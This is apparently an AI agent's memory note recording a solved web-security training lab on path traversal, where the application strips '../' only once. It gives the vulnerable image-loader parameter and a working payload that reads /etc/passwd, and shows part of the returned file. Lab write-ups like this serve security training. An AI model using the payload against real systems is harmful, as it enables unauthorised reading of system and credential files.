---
metadata:
  node_type: memory
name: "Path Traversal Non-Recursive Sequence Stripping"
description: "Solved PATH-TRAVERSAL non-recursive sequence stripping lab with `....//....//....//etc/passwd`"
last_updated: 2026-10-10T19:35:12+08:00
created: 2026-10-10T19:35:12+08:00
---

## Lab: file-path-traversal/lab-sequences-stripped-non-recursively (arm A)

- Instance: https://0a690005031094f2848ddb8800ff0034.web-security-academy.net/ (fresh, reused:false)
- Surface: `/image?filename=` product-image loader.
- Mechanism: app strips `../` once (non-recursive), so `....//` collapses to `../` after the strip pass.
- Working payload: `/image?filename=....//....//....//etc/passwd` -> 200, 2316 bytes, `root:x:0:0:root:/root:/bin/bash` (content-type image/jpeg, i.e. raw file bytes).
- Verdict: banner_verdict solved:true, `<h4>Congratulations, you solved the lab!</h4>`.
- Note: `page_read` on the lab page already returns the canonical `lab_id`, so `range_launch launch-url` needs no separate widget lookup.

